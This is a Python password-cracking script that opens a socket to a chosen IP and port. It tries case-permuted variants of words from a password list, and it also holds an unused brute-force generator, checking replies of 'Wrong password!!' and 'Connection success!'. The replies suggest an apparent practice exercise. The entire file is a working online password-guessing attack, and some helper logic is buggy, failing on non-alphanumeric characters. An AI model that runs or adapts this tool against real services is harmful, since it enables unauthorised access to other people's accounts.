import socket
import argparse
import itertools

def hack_pass(client_socket, char):
    while True:
        password = None
        counter = 0
        for i in range(1, len(char) + 1):
            for j in itertools.product(char, repeat=i):
                password = ''.join(j)
                counter += 1
                if counter > 1000000:
                    print("Too many attempts")
                    return None
                password = password.encode()
                client_socket.send(password)
                response = client_socket.recv(1024)
                response = response.decode()
                if response == "Wrong password!!":
                    pass
                elif response == "Connection success!":
                    password = password.decode()
                    return password

def check_pass(client_socket, password):
    password = password.encode()
    try:
        client_socket.send(password)
        response = client_socket.recv(1024)
        response = response.decode()
        if response == "Wrong password!!":
            pass
        elif response == "Connection success!":
            password = password.decode()
            print(password)
            return password
    except:
        pass

def word_process(word:str) -> set:
    if word == '':
        return ['']
    first_letter = word[:1]
    rest_letter = word[1:]
    if first_letter.isalpha():
        upper = first_letter.upper()
        lower = first_letter.lower()
        rest_permutation = word_process(rest_letter)
        permu_list = set()
        for item in rest_permutation:
            permu_list.add(upper + item)
            permu_list.add(lower + item)

        return permu_list

    elif first_letter.isnumeric():
        number = first_letter

        rest_permutation = word_process(rest_letter)
        permu_list = set()
        for item in rest_permutation:
            permu_list.add(number + item)

        return permu_list

def main():
    parser = argparse.ArgumentParser(description='ip address, port and message to be sent')
    parser.add_argument('ip', type=str, help="ip address of the site")
    parser.add_argument('port', type=int, help='port to be used')
    # parser.add_argument('message', type=str, help='message to be sent')
    args = parser.parse_args()
    client_socket = socket.socket()
    hostname = args.ip
    port = args.port
    address = (hostname, port)
    client_socket.connect(address)

    with open('passwords.txt', 'r') as password_file:
        pass_list = password_file.readlines()

    for word in pass_list:
        word = word.strip('\n')
        all_word_perm = word_process(word)
        for i in all_word_perm:
            check_pass(client_socket, i)

    client_socket.close()

if __name__ == "__main__":
    main()
